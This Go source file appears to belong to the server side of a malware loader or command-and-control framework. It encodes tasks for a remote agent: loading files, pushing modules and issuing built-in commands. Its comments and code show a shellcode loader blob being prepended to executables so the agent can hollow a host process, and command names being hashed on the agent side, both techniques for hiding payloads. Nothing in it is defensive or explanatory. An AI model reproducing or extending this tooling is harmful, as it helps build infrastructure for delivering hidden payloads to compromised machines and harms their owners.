package parser

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"

	"ldrserver/internal/modules"
)

const (
	fileTypeExe = 0xac
	taskLoad    = 0x1
	taskModule  = 0x3
	taskCmd     = 0x5
	taskNoTask  = 0xff
)

type Task struct {
	Id       int
	Code     int
	FileType int
	HasReloc int
	HasArgs  int
	FileUUID string
	Module   string
	Args     string
}

type Tasks struct {
	Total int
	Task  []Task
}

type Writer struct {
	buf bytes.Buffer
}

func NewWriter() *Writer {
	return &Writer{}
}

func (w *Writer) Write4(v uint32) {
	binary.Write(&w.buf, binary.LittleEndian, v)
}

func (w *Writer) WriteString(s string) {
	w.Write4(uint32(len(s)))
	w.buf.WriteString(s)
}

func (w *Writer) Bytes() []byte {
	return w.buf.Bytes()
}

func readTaskFile(fileUUID string) ([]byte, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	return os.ReadFile(filepath.Join(home, ".local", "share", "ldr", "files", fileUUID))
}

// readLoaderBlob returns the exemap PIC loader that must be prepended to a
// no-reloc EXE (see the agent's LdrHollowExe).
func readLoaderBlob() ([]byte, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	path := filepath.Join(home, ".local", "share", "ldr", "utils", "loader.bin")
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("no-reloc loader missing (%s): %w", path, err)
	}
	return b, nil
}

func (w *Writer) WriteTasks(tasks *Tasks) ([]byte, error) {
	for _, t := range tasks.Task {
		if err := w.writeTask(t); err != nil {
			return nil, err
		}
	}

	w.Write4(taskNoTask)
	return w.Bytes(), nil
}

func (w *Writer) writeTask(t Task) error {
	var data []byte
	var err error

	switch t.Code {
	case taskModule:
		data, err = modules.GetCode(t.Module)
	case taskLoad:
		data, err = readTaskFile(t.FileUUID)
		if err == nil && t.FileType == fileTypeExe && t.HasReloc == 0 {
			// A no-reloc EXE can't be mapped in-process; the agent hollows a
			// host process. LdrHollowExe expects [exemap loader][exe], since the
			// blob starts with shellcode rather than MZ.
			loader, lerr := readLoaderBlob()
			if lerr != nil {
				return lerr
			}
			data = append(loader, data...)
		}
	case taskCmd:
		// Built-in command handled by the agent itself. Send the name
		// NUL-terminated so the agent can hash it with HashStringA.
		data = append([]byte(t.Module), 0)
	default:
		return fmt.Errorf("unknown task code %d", t.Code)
	}
	if err != nil {
		return err
	}

	w.Write4(uint32(t.Code))
	w.Write4(uint32(t.Id))
	w.Write4(uint32(t.FileType))

	if t.FileType == fileTypeExe {
		w.Write4(uint32(t.HasReloc))
	}

	hasArgs := 0
	if (t.Code == taskModule || t.Code == taskCmd) && len(t.Args) > 0 {
		hasArgs = 1
	}
	if t.Code == taskModule || t.Code == taskCmd {
		w.Write4(uint32(hasArgs))
	}

	w.Write4(uint32(len(data)))
	w.buf.Write(data)

	if hasArgs == 1 {
		w.WriteString(t.Args)
	}
	return nil
}
